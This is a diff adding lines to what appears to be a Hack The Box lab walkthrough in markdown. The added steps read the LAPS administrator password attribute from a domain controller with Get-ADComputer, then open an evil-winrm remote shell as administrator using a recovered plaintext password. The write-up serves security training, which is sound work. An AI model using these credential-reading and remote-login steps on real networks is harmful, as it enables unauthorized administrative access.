@@ -54,3 +54,13 @@ upload AdmPwd.PS
 ![image](https://github.com/regarmulia/HTB/assets/33616880/0eeb2fa9-09a1-4cc8-9c21-69219178b416)
 
 
+```
+Get-ADComputer DC01 -property 'ms-mcs-admpwd'
+```
+![image](https://github.com/regarmulia/HTB/assets/33616880/27e1d01a-442f-4a88-89f8-08d0b427425b)
+
+
+```
+evil-winrm -i 10.10.11.152 -S -u administrator -p 'A+@PQh;Cj0+{Cb2oBJBybYry'
+```
+![image](https://github.com/regarmulia/HTB/assets/33616880/1b1a7314-434a-40e8-bca7-a9477253776c)
